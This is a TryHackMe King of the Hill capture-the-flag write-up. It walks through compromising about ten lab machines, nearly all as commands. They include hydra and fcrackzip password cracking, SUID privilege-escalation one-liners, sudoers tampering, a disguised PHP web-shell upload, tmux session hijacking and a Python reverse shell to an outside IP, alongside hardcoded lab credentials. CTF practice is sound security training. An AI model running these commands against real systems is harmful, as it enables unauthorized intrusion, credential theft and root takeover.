# TryHackMe KOTH Writeup.

#

# Panda

ssh shifu@$IP
password: batman

sudo -l



# offline

msfconsole -> eternalblue


# Hackers

use anonymous login on ftp. You will have a note saying that there is users with weak passwords.

only one of them is actually weak so time to hydra'ate.

`hydra ssh://$IP -l rcampbell -P ../../res/rockyou.txt -t 64` and use the creds to ssh.
> -t 64 is allowed here. Ignore -t 4 warning.

Now time to check capabilities. `getcap -r / 2> /dev/null`.

Oh python3 has setuid. Gotcha. Use `python3 -c 'import os,pty; os.setuid(0); pty.spawn("/bin/bash")'`

boom. You are root.



# H1:Hard

on oprt 80 -> admin:niceWorkHackerm4n

then on shell use python3 revshell `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.42.183",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`

then change to admin user using `ssh admin@localhost -t "bash --noprofile"`

change PATH with `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:`

then use `sudo chmod +s /bin/bash && /bin/bash -p`

then fdisk -l to list mounts

then mount it with `sudo mount /dev/xvda1 /mnt`

`(phoenix/.ssh/id_rsa.pub)` append to local `authorized_keys` then try to ssh into that account

then just sudo to root.





# Shrek

check the robots.txt file on port 80, it will give endpoint which will give ssh key for shrek user

`ssh -i id_rsa shrek@$IP`

then use SUID for gdb and get root.

change to proper root through changing the sudoers(Don't forget to change file permissions of sudoers)




# Fortune

get the base64 from `nc $IP 3333`

Convert that hash to file from online or anything.

use ` fcrackzip -v -u -D -p ../../res/rockyou.txt application.zip` to get the passcode of zip.

Then use `unzip application.zip` with passcode to get creds.txt

use this creds to `ssh`

then use `xargs` from gtfobins for SUID to get root.

Then use same sudoers technique to gain real root instead effective root.



# Food

there is a direct shell access on port `46969`

use `telnet $IP 46969`

You will be given user:password but they are ciphered with ceaser cipher. After decoding it is `food:givemecookies`

now `vim.basic` is a SUID. Use it to change /etc/sudoers and add food to run everything.

now `sudo su` with password or You can use NOPASSWD: ALL in /etc/sudoers too

DON"T forget to remove sudo privilleges from food once you get the root.



# Hogwarts

FORGET EVRYTHING AND RUN nmap scan and get the ports of the machine.

run `nmap -p- -vvv -sV $IP` or if you are really late then `nmap -p-20000 -vvv -sV $IP`

Better solution is to use browser based machine of thm. It will be life saver.

then login to ftp with anonymous and cd into `cd .../...`

you will have hidden .zip file. use `fcrackzip -v -u -D -p ../../res/rockyou.txt .I_saved_it_harry.zip` to crack password.

you will get ssh credentials for machine in `boot/.pass` it was this one in last attempt `neville:6mvv5yrw5ir55njoo45cf62l7`. Now ssh is on different port so that's why nmap scan is required.

Then it is just SUID.


# Tyler

On pert 80 webpage check /betatest which will show /etc/passwd so we get the username `narrator`.

now use `smbclient \\\\$IP\public` and get the alert.txt which includes the password for the user.

now use `/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'` as vim is SUID binary.

Now classic change the /etc/sudoers to get the proper root.


# Carnage

On port 82 use burpsuit to upload the shell.gif.php by changing the content type image/gif.

Get the reverse shell, and now go to /tmp/tmux-0

Now we will use already running tmux session and tap into it to become root.

use `tmux -S default attach -t default`

Now for the king.txt, it is attributed to append only mode. use `echo PhoenixCreation >> /root/king.txt`.


# Production

`ftp $IP` use anonymous login and get the id_rsa.

then `chmod 600 id_rsa` and `ssh -i id_rsa ashu@$IP`

then use `sudo /bin/su skidy` to become skidy.

then use `sudo /bin/git -p help config` and then `!/bin/sh` to get the root.

> On port 9001, use `nc $IP 9001` with password `yourmom!` to get ashu's shell.

> On port 9002, use `nc $IP 9002` to get direct root shell but it is restricted.



# TIPS

Find flags easily: `find / -name *flag*.txt -exec cat "{}" \; 2> /dev/null | egrep -i 'THM'` (Also you can use just `*flag*` but it would be bit slower.)
